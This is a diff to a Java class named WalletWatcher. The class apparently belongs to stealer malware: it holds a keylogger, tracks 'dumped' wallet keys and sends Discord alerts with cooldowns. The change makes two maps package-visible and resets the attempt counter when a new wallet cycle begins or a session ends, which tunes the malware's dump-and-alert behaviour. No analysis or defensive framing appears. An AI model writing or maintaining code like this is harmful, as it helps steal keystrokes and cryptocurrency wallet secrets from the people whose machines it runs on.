@@ -34,8 +34,8 @@ final class WalletWatcher {
 	private final Keylogger keylogger;
 
 	private final Object lock = new Object();
-	private final Map<String, Integer> attempts = new ConcurrentHashMap<>();
-	private final Map<String, Long> dumped = new ConcurrentHashMap<>();
+	final Map<String, Integer> attempts = new ConcurrentHashMap<>();
+	final Map<String, Long> dumped = new ConcurrentHashMap<>();
 	private final Map<String, Long> notified = new ConcurrentHashMap<>();
 	private volatile boolean restartKey = true;
 	int dumpSchedules;
@@ -211,6 +211,9 @@ final class WalletWatcher {
 			// must not alert or dump again.
 			notify = !dumpedAlready;
 			if (notify) {
+				// A genuinely new cycle (new key, or the same key after its
+				// cooldown) starts with a fresh attempt budget.
+				attempts.remove(key);
 				state.lastWalletKey = key;
 				state.walletEvents++;
 				state.walletCooldownUntil = now + DiscordConfig.walletCooldownSec() * 1000L;
@@ -261,6 +264,7 @@ final class WalletWatcher {
 			// restores the session without an alert or a second dump.
 			if (dead) {
 				dumped.remove(activeKey);
+				attempts.remove(activeKey);
 			}
 			activeKey = "";
 			activeName = "";
